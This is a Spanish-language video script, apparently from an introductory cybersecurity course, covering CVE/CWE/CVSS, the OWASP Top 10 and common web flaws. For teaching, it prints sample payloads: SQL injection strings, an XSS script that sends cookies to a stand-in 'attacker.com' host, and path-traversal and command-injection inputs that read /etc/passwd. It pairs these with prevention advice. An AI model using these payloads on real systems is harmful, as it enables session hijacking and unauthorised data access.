# 🎬 Video 06: Vulnerabilidades

**Duración:** 25 minutos
**Módulo:** Fundamentos 06
**Objetivo:** Entender CVE/CWE/CVSS, OWASP Top 10 y vulnerabilidades comunes

---

## 📝 Guión

### [00:00] Intro (30 seg)

```
"Bienvenido a CDPN. En este video vamos a hablar de vulnerabilidades.
¿Qué es una vulnerabilidad? Básicamente es una debilidad que un 
atacante puede explotar. Y hoy vas a aprender las más importantes."
```

---

### [00:30] ¿Qué es una Vulnerabilidad? (2 min)

**Visual:** Triángulo de vulnerabilidad

```
"Una vulnerabilidad necesita TRES ingredientes para ser un problema:

1. UNA DEBILIDAD — un bug, mala configuración, defecto de diseño
2. UN ATACANTE — alguien que la conoce y quiere explotarla
3. UN ACTIVO — algo que la organización quiere proteger

Sin estos tres, no hay incidente. Pero cuando se alinean, 
tenemos un problema serio."
```

---

### [02:30] CVE, CWE y CVSS (3 min)

**Visual:** 3 tarjetas explicativas

```
"Para hablar de vulnerabilidades, usamos tres sistemas:

📌 CVE — La matrícula
Es un ID único: CVE-2017-0144 (EternalBlue)
Cada vulnerabilidad tiene su CVE asignado por MITRE.

📌 CWE — La familia
Categoría de debilidad: CWE-79 (XSS), CWE-89 (SQLi)
Es la raíz del problema.

📌 CVSS — La gravedad
Escala de 0 a 10. CVSS 3.1 es la versión actual.
0-3.9 = Bajo
4-6.9 = Medio
7-8.9 = Alto
9-10 = Crítico

Y el scoring considera: exploitabilidad, impacto, complejidad."
```

---

### [05:30] OWASP Top 10 (4 min)

**Visual:** Lista animada

```
"OWASP Top 10 es LA lista de las 10 vulnerabilidades web más 
comunes. Actualizada en 2021:

1️⃣ A01 — Broken Access Control
   Un usuario hace cosas que no debería
   
2️⃣ A02 — Cryptographic Failures
   Datos sin cifrar, mal hashing
   
3️⃣ A03 — Injection
   SQLi, NoSQLi, command injection
   
4️⃣ A04 — Insecure Design
   Fallas de diseño, no de código
   
5️⃣ A05 — Security Misconfiguration
   Defaults inseguros, paneles admin abiertos
   
6️⃣ A06 — Vulnerable Components
   Dependencias sin parchear
   
7️⃣ A07 — Authentication Failures
   Login roto, sin MFA
   
8️⃣ A08 — Integrity Failures
   Actualizaciones sin verificar
   
9️⃣ A09 — Logging Failures
   Ataques que nadie ve
   
🔟 A10 — SSRF
   El servidor hace peticiones internas

Estas son las que MÁS verás en tu carrera."
```

---

### [09:30] SQL Injection (4 min)

**Visual:** Terminal con código SQL

```
"La primera y más famosa: SQL Injection.

Imagina un login:
SELECT * FROM users WHERE username='ADMIN' AND password='PASS'

Si el usuario escribe: admin' OR '1'='1
La query se convierte en:
SELECT * FROM users WHERE username='' OR '1'='1' AND password=''
→ ¡Resultado: acceso sin contraseña!

Y con UNION-based:
' UNION SELECT username,password FROM users--
→ Extrae TODA la base de datos

¿Cómo se previene? Consultas preparadas. NUNCA concatener input."
```

---

### [13:30] XSS (3 min)

**Visual:** Browser con código

```
"XSS = Cross-Site Scripting

El atacante inyecta JavaScript que se ejecuta en el navegador 
de la víctima.

Ejemplo:
<script>fetch('https://attacker.com/?c='+document.cookie)</script>

Si la app lo muestra sin escapar, el script roba cookies.

Variantes:
- Reflected: el payload viene en la URL
- Stored: el payload está guardado en la DB
- DOM-based: el payload manipula el DOM

Prevención: escapar output, CSP headers, sanitización."
```

---

### [16:30] Otras Vulns Comunes (4 min)

**Visual:** Tabla de vulnerabilidades

```
"Otras vulnerabilidades que verás:

🔹 SSRF — Server-Side Request Forgery
   El servidor hace peticiones a tu nombre
   GET /api/fetch?url=http://localhost:8080/admin

🔹 IDOR — Insecure Direct Object Reference
   Cambias un ID y ves datos de otro usuario
   GET /api/users/123 → yo soy el 123
   GET /api/users/124 → veo al otro sin permiso

🔹 Path Traversal
   Navegas por el sistema de archivos
   GET /download?file=../../../../etc/passwd

🔹 Command Injection
   Inyectas comandos del SO
   ; cat /etc/passwd

🔹 Hardcoded Secrets
   API keys en el código
   API_KEY = 'sk-1234567890' ← ¡Bots escanean GitHub!"
```

---

### [20:30] Reporte Profesional (2 min)

**Visual:** Template de reporte

```
"¿Cómo escribe un profesional un reporte?

TITLE: Stored XSS in profile name via SVG upload
SEVERITY: High (CVSS 7.4)
DESCRIPTION: When uploading SVG, server doesn't sanitize script tags
STEPS TO REPRODUCE: 1, 2, 3...
IMPACT: Attacker can hijack sessions
SUGGESTED FIX: Serve uploads from separate domain
EVIDENCE: [screenshots]

Un buen reporte es claro, conciso y accionable."
```

---

### [22:30] Resumen (2 min)

**Visual:** Key points

```
"Resumimos:

✅ Una vulnerabilidad = debilidad + atacante + activo
✅ CVE es la matrícula, CWE la familia, CVSS la gravedad
✅ OWASP Top 10 es tu referencia principal
✅ SQLi y XSS son las más comunes
✅ Un buen reporte salva vidas

En el próximo video veremos Ética y Leyes.
Nos vemos."
```

---

*Script creado para CDPN — Video 06 de Fundamentos*
